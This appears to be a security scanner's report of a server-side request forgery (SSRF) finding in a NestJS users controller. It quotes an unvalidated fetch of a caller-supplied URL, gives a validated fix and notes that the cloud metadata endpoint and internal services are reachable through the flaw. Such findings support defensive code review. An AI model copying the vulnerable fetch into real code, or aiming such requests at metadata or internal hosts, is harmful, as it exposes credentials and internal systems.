HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
------------------------------------------------------------------------
 src/users/users.controller.ts:80:28

  78 |   async importRemote(@Body() body: { sourceUrl?: string }) {
  79 |     // ssrf
  80 |     const upstream = await fetch(body.sourceUrl as string)
     |                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
  81 |     return upstream.json()
  82 |   }

 -> fix (NestJS)   Validate in the service, not the controller, so every
                   caller of it is covered.
                   const target = assertAllowedUrl(dto.url)
                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
 -> why            The destination of this request comes from the
                   caller, so they choose which host the server connects
                   to. That includes hosts they cannot reach themselves:
                   the cloud metadata endpoint that hands out IAM
                   credentials, internal services that skip
                   authentication because they are 'not exposed', and
                   anything bound to localhost.
 i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf

